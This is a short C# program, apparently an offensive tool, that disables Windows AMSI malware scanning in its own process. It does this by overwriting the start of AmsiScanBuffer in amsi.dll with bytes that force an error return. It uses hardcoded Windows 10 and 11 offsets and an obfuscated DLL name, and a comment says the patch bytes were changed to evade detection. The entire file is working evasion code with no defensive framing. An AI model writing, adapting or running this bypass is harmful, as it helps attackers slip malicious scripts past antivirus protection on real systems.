using System;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;

namespace PHANTOM
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static IntPtr ASLR(IntPtr Relative_Address, IntPtr Relative_BaseAddress, string ModuleName)
        {
            return (IntPtr)((long)Relative_Address - (long)Relative_BaseAddress + (long)GetModuleHandle(ModuleName));
        }

#if x64
        private static IntPtr amsiScanBufferAddress_Win11 = (IntPtr)0x1800081A0; //May change in the future!
        private static IntPtr amsiScanBufferAddress_Win10 = (IntPtr)0x180003880; //May change in the future!
        private static IntPtr RebaseAddress = (IntPtr)0x180000000;
#else
        private static IntPtr amsiScanBufferAddress_Win11 = (IntPtr)0x10005D60; //May change in the future!
        private static IntPtr amsiScanBufferAddress_Win10 = (IntPtr)0x10005960; //May change in the future!
        private static IntPtr RebaseAddress = (IntPtr)0x10000000;
#endif

        private static uint PAGE_EXECUTE_READWRITE = 0x40;

        private static string obfDll_Str = @"*a*m*s*i*.*d*l*l*".Replace(@"*", @"");

        [STAThread]
        static void Main()
        {
            IntPtr Address = IntPtr.Zero;
            if (new ComputerInfo().OSFullName.Contains(@"11") == true)
            {
                Address = ASLR(amsiScanBufferAddress_Win11, RebaseAddress, obfDll_Str);
            }
            else
            {
                Address = ASLR(amsiScanBufferAddress_Win10, RebaseAddress, obfDll_Str);
            }
            byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80,0x48, 0x8B, 0x04, 0x24,0x48, 0x83, 0xC4, 0x08,0xFF, 0xE0 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }; //0xC3 = RET is being flagged and cant be written so we needed update the patch byte.
            uint oldProtect;
            VirtualProtect(Address, (UIntPtr)Patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
            Marshal.Copy(Patch, 0, Address, Patch.Length);
            VirtualProtect(Address, (UIntPtr)Patch.Length, oldProtect, out oldProtect);
        }
    }
}
